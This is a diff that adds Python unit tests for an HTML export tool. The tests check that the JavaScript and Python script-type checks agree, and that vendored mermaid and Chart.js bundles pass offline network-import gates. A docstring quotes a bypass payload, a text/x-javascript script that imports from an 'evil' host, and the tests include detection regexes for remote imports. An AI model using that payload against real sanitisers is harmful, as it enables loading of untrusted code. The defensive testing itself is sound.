@@ -24,6 +24,7 @@ import _paths  # noqa: E402
 sys.path.insert(0, _paths.TOOLS)
 import vendored_libs  # noqa: E402
 import new_document  # noqa: E402
+from checks import parsing  # noqa: E402
 
 
 def _doc(fragment):
@@ -667,6 +668,128 @@ class RuntimeParityTests(unittest.TestCase):
                 vendored_libs.content_needs_rich_libs(_doc("<h1>H</h1>\n" + fragment)),
                 "content matching the runtime selector %r must be detected as needing the "
                 "libraries" % selector)
+
+
+    def test_the_python_and_js_runnable_script_type_predicates_agree(self):
+        """The offline strips (JS) and the strict validator (Python) must call the SAME script
+        types executable.
+
+        They are two independent implementations of the HTML "JavaScript MIME type" set, and a
+        drift between them is invisible: the validator would declare an offline file clean while
+        the exporter's strips no longer protect it (or the reverse, so the gate rejects a file the
+        exporter just produced). That is not hypothetical - the validator's set was the narrow
+        five-type one for as long as the strips' was, so `<script type="text/x-javascript">
+        import("https://evil/")</script>` passed `validate.py --strict` as offline-clean.
+
+        Two-directional: the corpus mixes every accepted type with inert and near-miss ones
+        (`text/javascript1.6` is deliberately NOT a JavaScript MIME type), so this fails whether an
+        implementation drops a type or gains one the other does not have.
+        """
+        source = self._read("68-export-offline.js")
+        start = source.find("function _offlineIsRunnableScriptType")
+        self.assertNotEqual(start, -1,
+                            "the runtime no longer defines _offlineIsRunnableScriptType; the "
+                            "parity check is stale and must be re-pointed at whatever replaced it")
+        body = source[start:source.find("\n}", start)]
+        patterns = re.findall(r"/\^((?:[^/\\]|\\.)*)\$/", body)
+        self.assertEqual(len(patterns), 2,
+                         "expected exactly 2 anchored type regexes in the runtime predicate, got "
+                         "%r - the extraction is stale" % (patterns,))
+        runtime_res = [re.compile("^" + p.replace("\\/", "/") + "$") for p in patterns]
+
+        def runtime_says_runnable(raw):
+            normalized = str(raw or "").split(";")[0].strip().lower()
+            if not normalized or normalized == "module":
+                return True
+            return any(rx.match(normalized) for rx in runtime_res)
+
+        # The accepted list is written out LITERALLY rather than derived from `_JS_TYPES`: a corpus
+        # built from the set under test shrinks with it, so removing a type would silently remove
+        # its own coverage and the check would pass. Unioning `_JS_TYPES` on top covers the other
+        # direction (a type ADDED to only one implementation).
+        accepted = {"", "module", "text/javascript", "application/javascript",
+                    "text/x-javascript", "application/x-javascript",
+                    "text/ecmascript", "application/ecmascript",
+                    "text/x-ecmascript", "application/x-ecmascript",
+                    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
+                    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
+                    "text/jscript", "text/livescript"}
+        corpus = sorted(accepted | set(parsing._JS_TYPES) | {
+            # inert: data or transpiler-only, must NOT count as executable on either side
+            "text/plain", "application/json", "application/ld+json", "importmap",
+            "speculationrules", "text/template", "text/babel", "text/jsx",
+            "text/x-handlebars-template", "text/vbscript",
+            # near misses and normalization
+            "text/javascript1.6", "text/javascript1.", "text/ecmascript6", "javascript",
+            "  TEXT/JavaScript  ", "text/javascript; charset=utf-8", "module; x=1",
+        })
+        for raw in accepted:
+            self.assertTrue(runtime_says_runnable(raw),
+                            "the runtime predicate no longer runs %r, which the HTML JavaScript "
+                            "MIME type set says a browser executes" % raw)
+        self.assertEqual(
+            accepted, set(parsing._JS_TYPES),
+            "the literal accepted-type list in this test and the validator's _JS_TYPES have "
+            "diverged. Both are deliberate spellings of the HTML JavaScript MIME type set; move "
+            "them together, or the corpus silently stops covering whatever was dropped.")
+        for raw in corpus:
+            self.assertEqual(
+                runtime_says_runnable(raw), parsing._is_executable_js({"type": raw}),
+                "the runtime's _offlineIsRunnableScriptType and the validator's _JS_TYPES "
+                "disagree about %r. Update BOTH: a type only one of them runs is either an "
+                "unstripped executable script the gate blesses, or a false rejection." % raw)
+
+
+    def test_the_vendored_bundles_pass_the_offline_capture_gates(self):
+        """The re-export fallback runs the captured library through the same content gates it
+        applies to any other candidate, so the VENDORED bytes must satisfy them.
+
+        Both gates are cheap today only because the bundles happen to be clean. That is a property
+        of the vendored files, not of the code, so a routine `mermaid` / `Chart.js` upgrade could
+        silently make a legitimate re-export fail with the exact "missing the vendored bundle"
+        toast this feature exists to remove. Pin it here, where a dependency bump trips it, rather
+        than in a browser test nobody connects to the upgrade.
+        """
+        source = self._read("68-export-offline.js")
+        start = source.find("function _offlineScriptHasNetworkImport")
+        self.assertNotEqual(start, -1, "the runtime no longer defines _offlineScriptHasNetworkImport")
+        body = source[start:source.find("\n}", start)]
+        patterns = re.findall(r"/((?:[^/\\\n]|\\.)+)/i?\.test\(src\)", body)
+        self.assertEqual(
+            len(patterns), 5,
+            "_offlineScriptHasNetworkImport no longer has exactly 5 regex terms (found %d). The "
+            "sufficient condition asserted below was derived from those terms; re-derive it."
+            % len(patterns))
+
+        # Assert a SUFFICIENT condition rather than re-evaluating the predicate: every one of its
+        # terms requires a dynamic `import(` or a remote `from`/`import` string literal, so a bundle
+        # with none of those cannot match any term. (Checking the terms individually would be
+        # wrong - one of them is a conjunction, and its URL-literal half matches an innocuous
+        # xlink namespace string inside mermaid.)
+        blockers = [
+            re.compile(r"\bimport\s*\("),
+            re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE),
+            re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE),
+        ]
+        vendor = os.path.join(_paths.DEV, "assets", "vendor")
+        for name in ("mermaid.min.js", "chart.umd.min.js"):
+            path = os.path.join(vendor, name)
+            self.assertTrue(os.path.exists(path), "missing vendored bundle %s" % path)
+            with open(path, "r", encoding="utf-8", newline="") as fh:
+                code = fh.read()
+            for rx in blockers:
+                self.assertIsNone(
+                    rx.search(code),
+                    "%s now contains %r, so it can trip the offline network-import check and the "
+                    "re-export capture gate would REJECT the genuine library - a re-export would "
+                    "fail loudly with 'missing the vendored bundle'. Re-check the bundle, or "
+                    "narrow that check." % (name, rx.pattern))
+            # `<script` (and an end tag) would open a script-data escape in the re-emitted element;
+            # a bare `<!--` is harmless on its own, and mermaid legitimately contains one.
+            self.assertIsNone(
+                re.search(r"<\/?script|<\/style", code, re.IGNORECASE),
+                "%s now contains a script-data escape sequence, so the re-export capture gate "
+                "would reject the genuine library." % name)
 
 
 if __name__ == "__main__":
